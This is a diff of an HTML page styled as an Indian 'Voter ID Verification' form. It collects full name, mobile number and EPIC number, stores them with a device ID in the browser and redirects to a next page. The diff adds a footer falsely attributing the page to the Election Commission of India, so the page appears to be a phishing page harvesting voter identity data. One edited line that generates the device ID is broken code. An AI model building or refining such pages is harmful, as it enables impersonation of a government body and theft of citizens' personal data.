@@ -3,68 +3,150 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Voter ID Verification Form</title>
+    <title>Voter ID Verification - Home</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        body { background-color: #0056b3; height: 100vh; display: flex; justify-content: center; align-items: center; }
-        .form-container { background: #ffffff; padding: 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3); width: 100%; max-width: 450px; }
-        .form-container h2 { text-align: center; margin-bottom: 25px; color: #0056b3; font-size: 24px; }
-        .form-group { margin-bottom: 20px; }
-        .form-group label { display: block; margin-bottom: 8px; color: #333; font-weight: 600; font-size: 14px; }
-        .form-group input { width: 100%; padding: 12px 15px; border: 1px solid #ccc; border-radius: 6px; font-size: 15px; }
-        .form-group input:focus { outline: none; border-color: #0056b3; box-shadow: 0 0 5px rgba(0, 86, 179, 0.3); }
-        .btn-next { width: 100%; padding: 12px; background: #0056b3; border: none; border-radius: 6px; color: white; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
-        .btn-next:hover { background: #004085; }
-        .btn-next:disabled { background: #6c757d; cursor: not-allowed; }
+        
+        body { 
+            background-color: #0056b3; 
+            min-height: 100vh; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            padding: 20px; 
+        }
+
+        .form-container { 
+            background: #ffffff; 
+            padding: 35px; 
+            border-radius: 12px; 
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3); 
+            width: 100%; 
+            max-width: 450px; 
+        }
+
+        .form-container h2 { 
+            text-align: center; 
+            margin-bottom: 20px; 
+            color: #0056b3; 
+            font-size: 22px; 
+        }
+
+        .form-group { 
+            margin-bottom: 15px; 
+        }
+
+        .form-group label { 
+            display: block; 
+            margin-bottom: 6px; 
+            color: #333; 
+            font-weight: 600; 
+            font-size: 13px; 
+        }
+
+        .form-group input { 
+            width: 100%; 
+            padding: 10px 14px; 
+            border: 1px solid #ccc; 
+            border-radius: 6px; 
+            font-size: 14px; 
+            background: #fff; 
+        }
+
+        .form-group input:focus { 
+            outline: none; 
+            border-color: #0056b3; 
+            box-shadow: 0 0 5px rgba(0, 86, 179, 0.3); 
+        }
+
+        .btn-next { 
+            width: 100%; 
+            padding: 12px; 
+            background: #0056b3; 
+            border: none; 
+            border-radius: 6px; 
+            color: white; 
+            font-size: 16px; 
+            font-weight: bold; 
+            cursor: pointer; 
+            margin-top: 10px; 
+        }
+
+        .btn-next:hover { 
+            background: #004085; 
+        }
+
+        /* Footer (कॉपीराइट टेक्स्ट) की डिज़ाइन */
+        .footer-text {
+            text-align: center;
+            margin-top: 25px;
+            font-size: 12px;
+            color: #666;
+            font-weight: 600;
+            border-top: 1px solid #eee;
+            padding-top: 15px;
+        }
     </style>
 </head>
 <body>
     <div class="form-container">
-        <h2>Voter ID Details</h2>
+        <h2>Voter ID Verification</h2>
+        
         <form id="voterForm">
             <div class="form-group">
-                <label for="fullname">Enter Your Full Name (as per Voter ID)</label>
-                <input type="text" id="fullname" name="fullname" placeholder="Enter your full name" required>
+                <label for="fullname">Full Name (As per Voter ID)</label>
+                <input type="text" id="fullname" name="fullname" placeholder="Enter full name" required>
             </div>
+            
             <div class="form-group">
-                <label for="mobile">Enter Your Mobile Number</label>
-                <input type="tel" id="mobile" name="mobile" placeholder="Enter 10-digit mobile number" pattern="[0-9]{10}" required>
+                <label for="mobile">Mobile Number</label>
+                <input type="tel" id="mobile" name="mobile" placeholder="Enter mobile number" maxlength="10" required>
             </div>
+
             <div class="form-group">
-                <label for="epic">Enter Your EPIC Number</label>
+                <label for="epic">EPIC Number (Voter ID Number)</label>
                 <input type="text" id="epic" name="epic" placeholder="Enter EPIC number" required>
             </div>
-            <button type="submit" id="nextBtn" class="btn-next">Next</button>
+
+            <button type="submit" class="btn-next">Next</button>
         </form>
+
+        <!-- यहाँ पर सबसे नीचे कॉपीराइट जोड़ दिया गया है -->
+        <div class="footer-text">
+            © 2026 Election Commission of India. All rights reserved.
+        </div>
     </div>
 
     <script>
         document.getElementById('voterForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
-            const fullname = document.getElementById('fullname').value;
-            const mobile = document.getElementById('mobile').value;
-            const epic = document.getElementById('epic').value;
-            const time = new Date().toLocaleString();
-
+            // Device ID generate karne ka logic
             let deviceId = localStorage.getItem('voterDeviceId');
             if (!deviceId) {
-                deviceId = 'DEV_' + Math.random().toString(36).substring(2, 8).toUpperCase() + '_' + Date.now();
+                deviceId = 'DEV-' + Math.random().toString(36.substr(2, 9)).toUpperCase();
                 localStorage.setItem('voterDeviceId', deviceId);
             }
 
+            const fullname = document.getElementById('fullname').value;
+            const mobile = document.getElementById('mobile').value;
+            const epic = document.getElementById('epic').value;
+
             let submissions = JSON.parse(localStorage.getItem('voterSubmissions')) || [];
             
-            submissions.push({ deviceId, fullname, mobile, epic, time });
+            // Naya entry save karein
+            submissions.push({
+                deviceId: deviceId,
+                fullname: fullname,
+                mobile: mobile,
+                epic: epic,
+                time: new Date().toLocaleTimeString()
+            });
+
             localStorage.setItem('voterSubmissions', JSON.stringify(submissions));
 
-            const btn = document.getElementById('nextBtn');
-            btn.disabled = true;
-            btn.innerText = "Processing...";
-
-            setTimeout(() => {
-                window.location.href = "secondpage.html"; 
-            }, 1000);
+            // Agle page par bhejें
+            window.location.href = "next.html";
         });
     </script>
 </body>
